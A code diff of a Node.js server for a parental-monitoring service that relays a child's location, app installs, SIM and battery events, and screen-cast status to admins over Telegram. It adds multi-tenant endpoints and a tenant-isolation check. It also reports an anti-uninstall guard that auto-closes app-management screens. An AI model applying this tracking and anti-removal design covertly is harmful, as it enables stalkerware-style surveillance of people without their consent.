@@ -2631,7 +3060,7 @@ wss.on('connection', (ws, req) => {
           payload.deviceId = deviceId;
           broadcastToAdmins(payload);
           if (bot && payload.error) {
-            notifyAdmin(`📶 *Network info failed* — ${escapeMd(dev.childName)}\n${escapeMd(payload.error)}`);
+            notifyAdmin(`📶 *Network info failed* — ${escapeMd(dev.childName)}\n${escapeMd(payload.error)}`, { deviceId });
           }
 
         } else if (payload.type === 'app_usage_result') {
@@ -2653,7 +3082,7 @@ wss.on('connection', (ws, req) => {
               `Child ${dir} the safe zone\n` +
               `📏 Distance from center: *${payload.distanceM}m* (radius ${payload.radiusM}m)\n` +
               `🗺️ https://www.google.com/maps?q=${payload.lat},${payload.lng}\n🕐 ${t}`,
-              { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
+              { deviceId, reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
             );
           }
 
@@ -2666,7 +3095,7 @@ wss.on('connection', (ws, req) => {
             const verb = ev === 'installed' ? 'was INSTALLED' : (ev === 'updated' ? 'was UPDATED' : 'was UNINSTALLED');
             notifyAdmin(
               `${emoji} *App ${verb}* on ${escapeMd(dev.childName)}\n\n📦 *${escapeMd(payload.app)}*\n\`${escapeMdCode(payload.package)}\`\n🕐 ${t}`,
-              { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
+              { deviceId, reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
             );
           }
 
@@ -2884,7 +3313,7 @@ wss.on('connection', (ws, req) => {
           broadcastToAdmins({ ...payload, deviceId });
           broadcastDeviceList();
           if (bot && payload.active === false && payload.message) {
-            notifyAdmin(`📺 *Screen-cast note — ${escapeMd(dev.childName)}*\n${escapeMd(payload.message)}`);
+            notifyAdmin(`📺 *Screen-cast note — ${escapeMd(dev.childName)}*\n${escapeMd(payload.message)}`, { deviceId });
           }
 
         } else if (payload.type === 'uninstall_guard_event') {
@@ -2894,8 +3323,31 @@ wss.on('connection', (ws, req) => {
           if (bot) {
             notifyAdmin(
               `🛡️ *Self-protection triggered — ${escapeMd(dev.childName)}*\n\n${escapeMd(payload.detail || 'Uninstall / app-management screen was auto-closed.')}\n🕐 ${gTime}`,
-              { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
+              { deviceId, reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
             );
+          }
+
+        } else if (payload.type === 'device_status') {
+          // Battery / charging / SIM events relayed by DeviceStatusReceiver.
+          const dTime = new Date().toLocaleString();
+          broadcastToAdmins({ ...payload, deviceId, timeLabel: dTime });
+          if (payload.event === 'battery_low') dev.lowBattery = true;
+          if (payload.event === 'battery_okay') dev.lowBattery = false;
+          if (bot) {
+            const iconByEvent = {
+              battery_low: '🪫', battery_okay: '🔋', power_connected: '⚡',
+              power_disconnected: '🔌', sim_removed: '📵', sim_changed: '📶'
+            };
+            const icon = iconByEvent[payload.event] || 'ℹ️';
+            const urgent = payload.event === 'sim_removed' || payload.event === 'sim_changed' || payload.event === 'battery_low';
+            const statusMsg =
+              `${icon} *${escapeMd(payload.title || 'Device alert')} — ${escapeMd(dev.childName)}*\n\n` +
+              `${escapeMd(payload.detail || '')}\n🕐 ${dTime}`;
+            if (urgent) {
+              notifyAdmin(statusMsg, { deviceId, reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } });
+            } else {
+              notifyAdmin(statusMsg, { deviceId });
+            }
           }
 
         } else {
@@ -2909,6 +3361,12 @@ wss.on('connection', (ws, req) => {
           const { targetDeviceId, command } = payload;
           const targetDev = childDevices.get(targetDeviceId);
           if (!targetDev) { console.warn(`[WS] Command to missing device: ${targetDeviceId}`); return; }
+          // Tenant isolation: a member may only command its own devices.
+          if (ws._owner !== 'master' && targetDev.owner !== ws._owner) {
+            console.warn(`[WS] Blocked cross-tenant command: ${ws._owner} -> ${targetDev.owner}/${targetDeviceId}`);
+            ws.send(JSON.stringify({ type: "error", message: "Not your device" }));
+            return;
+          }
 
           if (command === 'update_policy' && payload.blockedApps !== undefined) {
             targetDev.blockedApps = payload.blockedApps;
@@ -2928,12 +3386,17 @@ wss.on('connection', (ws, req) => {
 
   ws.on('close', () => {
     if (clientRole === 'android' && deviceId) {
-      const name = childDevices.get(deviceId)?.childName || deviceId;
+      const dev = childDevices.get(deviceId);
+      const name = (dev && dev.childName) || deviceId;
+      const disconnectedOwner = dev && dev.owner;
       childDevices.delete(deviceId);
       lowBatteryAlerted.delete(deviceId);
       console.log(`[WS] Android disconnected: "${deviceId}"`);
       broadcastDeviceList();
-      notifyDeviceDisconnected(deviceId, name);
+      notifyAdmin(
+        `🔴 *Device Disconnected*\n\n👦 *${escapeMd(name)}* (\`${deviceId}\`) offline hoy gese.`,
+        { owner: disconnectedOwner }
+      );
     } else if (clientRole === 'admin') {
       adminSockets.delete(ws);
     }
@@ -2941,28 +3404,46 @@ wss.on('connection', (ws, req) => {
 });
 
 // ── WebSocket upgrade ───────────────────────────────────────────────────
+// Accepts the legacy master endpoint /ws and per-member endpoints /ws/<user>.
 server.on('upgrade', (request, socket, head) => {
-  const pathname = new URL(request.url, `http://${request.headers.host}`).pathname;
-  if (pathname === '/ws' || pathname === '/ws/') {
-    wss.handleUpgrade(request, socket, head, (ws) => wss.emit('connection', ws, request));
-  } else {
-    socket.destroy();
+  let pathname = '/';
+  try {
+    pathname = new URL(request.url, `http://${request.headers.host || 'localhost'}`).pathname;
+  } catch (_) {
+    return socket.destroy();
   }
+  const m = pathname.match(/^\/ws(?:\/([A-Za-z0-9_-]{2,32}))?\/?$/);
+  if (!m) return socket.destroy();
+
+  if (m[1]) {
+    const t = getTenant(m[1]);
+    if (!t || !t.isActive) return socket.destroy();
+    request._tenant = t;
+  }
+  wss.handleUpgrade(request, socket, head, (ws) => wss.emit('connection', ws, request));
 });
 
 // ════════════════════════════════════════════════════════════════════
 // START
 // ════════════════════════════════════════════════════════════════════
 
-server.listen(PORT, () => {
-  console.log(`\n══════════════════════════════════════════════════`);
-  console.log(` PARENTAL SHIELD SERVER v2.0`);
-  console.log(` Web Panel : http://localhost:${PORT}`);
-  console.log(` WebSocket : ws://localhost:${PORT}/ws`);
-  console.log(` Bot       : ${BOT_TOKEN ? "Active ✅" : "Not configured ❌ (set BOT_TOKEN)"}`);
-  console.log(` Admin TG  : ${ADMIN_TG_ID}`);
-  console.log(` Public URL: ${PUBLIC_URL || "Not set (Mini App won't work)"}`);
-  console.log(`══════════════════════════════════════════════════\n`);
+async function bootstrap() {
+  try { await db.init(); } catch (e) { console.error('[DB] init failed:', e.message); }
+  try { await loadTenants(); } catch (e) { console.error('[TENANTS] load failed:', e.message); }
 
-  initTelegramBot();
-});
+  server.listen(PORT, () => {
+    console.log(`\n══════════════════════════════════════════════════`);
+    console.log(` PARENTAL SHIELD SERVER v2.0`);
+    console.log(` Web Panel : http://localhost:${PORT}`);
+    console.log(` WebSocket : ws://localhost:${PORT}/ws`);
+    console.log(` Bot       : ${BOT_TOKEN ? "Active ✅" : "Not configured ❌ (set BOT_TOKEN)"}`);
+    console.log(` Admin TG  : ${ADMIN_TG_ID}`);
+    console.log(` Members   : ${tenants.size} (db: ${db.getMode()})`);
+    console.log(` Public URL: ${PUBLIC_URL || "Not set (Mini App won't work)"}`);
+    console.log(`══════════════════════════════════════════════════\n`);
+
+    initTelegramBot();
+  });
+}
+
+bootstrap();
